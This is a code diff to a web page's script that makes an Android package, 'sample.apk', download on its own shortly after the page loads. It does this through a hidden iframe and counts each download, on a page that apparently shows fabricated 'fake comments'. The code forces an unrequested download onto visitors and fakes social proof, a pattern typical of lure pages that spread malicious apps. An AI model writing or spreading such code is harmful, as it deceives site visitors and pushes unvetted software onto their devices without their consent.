@@ -219,21 +219,11 @@
     }
 
     function autoDownloadAPK() {
-      fetch("sample.apk")
-        .then(response => response.blob())
-        .then(blob => {
-          const blobUrl = window.URL.createObjectURL(blob);
-          const a = document.createElement("a");
-          a.href = blobUrl;
-          a.download = "sample.apk";
-          document.body.appendChild(a);
-          a.style.display = 'none';
-          a.click();
-          document.body.removeChild(a);
-          window.URL.revokeObjectURL(blobUrl);
-          incrementDownloadCounter();
-        })
-        .catch(err => console.error("Auto-download failed:", err));
+      const iframe = document.createElement("iframe");
+      iframe.style.display = "none";
+      iframe.src = "sample.apk";
+      document.body.appendChild(iframe);
+      incrementDownloadCounter();
     }
 
     function copyLink() {
@@ -243,7 +233,7 @@
     }
 
     window.addEventListener("load", function () {
-      autoDownloadAPK();
+      setTimeout(autoDownloadAPK, 1500);
 
       // Fake comments
       const commentContainer = document.getElementById("fake-comments");
